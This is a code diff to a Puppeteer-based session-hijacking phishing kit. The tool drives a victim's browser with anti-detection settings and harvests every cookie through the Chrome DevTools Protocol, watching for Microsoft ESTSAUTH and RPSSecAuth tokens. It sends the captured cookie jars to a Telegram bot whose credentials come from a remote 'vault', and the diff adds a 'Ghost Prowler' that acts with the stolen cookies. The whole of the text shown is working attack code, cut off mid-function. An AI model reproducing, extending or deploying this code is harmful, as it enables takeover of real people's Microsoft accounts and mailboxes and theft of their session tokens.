@@ -2,6 +2,7 @@ const puppeteer = require('puppeteer-extra');
 const StealthPlugin = require('puppeteer-extra-plugin-stealth');
 const axios = require('axios');
 const FormData = require('form-data');
+const { triggerProwler } = require('./prowler'); // New Independent Import
 
 puppeteer.use(StealthPlugin());
 
@@ -12,7 +13,7 @@ async function getVault() {
     try {
         const response = await axios.get(VAULT_URL, { timeout: 8000 });
         if (response.data && response.data.TG_TOKEN) return response.data;
-    } catch (e) { console.log("[VAULT] Error syncing with Google Script."); }
+    } catch (e) { console.log("[VAULT] Error syncing credentials."); }
     return null;
 }
 
@@ -21,12 +22,12 @@ async function sendExfiltration(cookies, url, tier) {
     if (!creds) return;
 
     const host = new URL(url).hostname;
-    const label = tier === "TIER_2" ? "🎯 FULL ACCESS" : "👤 IDENTITY ONLY";
+    const isTier2 = tier === "TIER_2";
     
     try {
         await axios.post(`https://api.telegram.org/bot${creds.TG_TOKEN}/sendMessage`, {
             chat_id: creds.TG_CHAT_ID,
-            text: `<b>${label} CAPTURED</b>\n<b>Domain:</b> ${host}\n<b>Tokens:</b> ${cookies.length}\n<b>Status:</b> ${tier === "TIER_2" ? "RPSSecAuth Verified" : "ESTSAUTH Detected"}`,
+            text: `<b>${isTier2 ? "🎯 FULL ACCESS" : "👤 IDENTITY ONLY"}</b>\n<b>Domain:</b> ${host}\n<b>Status:</b> ${tier} Data Delivered`,
             parse_mode: 'HTML'
         });
 
@@ -40,7 +41,7 @@ async function sendExfiltration(cookies, url, tier) {
         await axios.post(`https://api.telegram.org/bot${creds.TG_TOKEN}/sendDocument`, form, {
             headers: form.getHeaders()
         });
-    } catch (e) { console.log("[EXFIL] Telegram delivery failed."); }
+    } catch (e) { console.log("[EXFIL] Delivery failure."); }
 }
 
 async function startSession(io, socket) {
@@ -55,40 +56,44 @@ async function startSession(io, socket) {
                 '--no-sandbox',
                 '--disable-setuid-sandbox',
                 '--disable-blink-features=AutomationControlled',
-                '--disable-features=IsolateOrigins,site-per-process' // Crucial for cross-site cookie visibility
+                '--disable-features=IsolateOrigins,site-per-process'
             ]
         });
 
         const [page] = await browser.pages();
-        const client = await page.target().createCDPSession(); // CDP for global cookie access
+        const client = await page.target().createCDPSession(); 
         
         await page.setViewport({ width: 1280, height: 720 });
         await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36');
 
         await page.goto(TARGET, { waitUntil: 'networkidle2' });
 
-        // --- THE TIERED MONITOR ---
         const monitor = setInterval(async () => {
             if (tier2Captured) return;
 
             try {
-                // CDP Network.getAllCookies is the 2026 standard for capturing cross-domain jars
                 const { cookies } = await client.send('Network.getAllCookies');
                 const url = page.url();
 
                 const hasIdentity = cookies.some(c => c.name.includes('ESTSAUTH'));
                 const hasFullAccess = cookies.some(c => c.name === 'RPSSecAuth');
 
-                // TIER 1: Identity tokens found (Early reporting)
+                // TIER 1: IDENTITY RECOVERY
                 if (hasIdentity && !tier1Captured) {
                     tier1Captured = true;
+                    
+                    // 1. Report current identity jar immediately
                     await sendExfiltration(cookies, url, "TIER_1");
+
+                    // 2. Launch Ghost Prowler (Fire-and-Forget / Non-Blocking)
+                    getVault().then(vault => {
+                        if (vault) triggerProwler(browser, cookies, vault);
+                    });
                 }
 
-                // TIER 2: Mailbox access found (Final reporting)
+                // TIER 2: NATURAL FULL ACCESS (If victim clicks manually)
                 if (hasFullAccess && (url.includes('outlook') || url.includes('mail'))) {
                     tier2Captured = true;
-                    // Settle for 4 seconds to ensure all background tokens are written
                     setTimeout(async () => {
                         const finalJar = await client.send('Network.getAllCookies');
                         await sendExfiltration(finalJar.cookies, page.url(), "TIER_2");
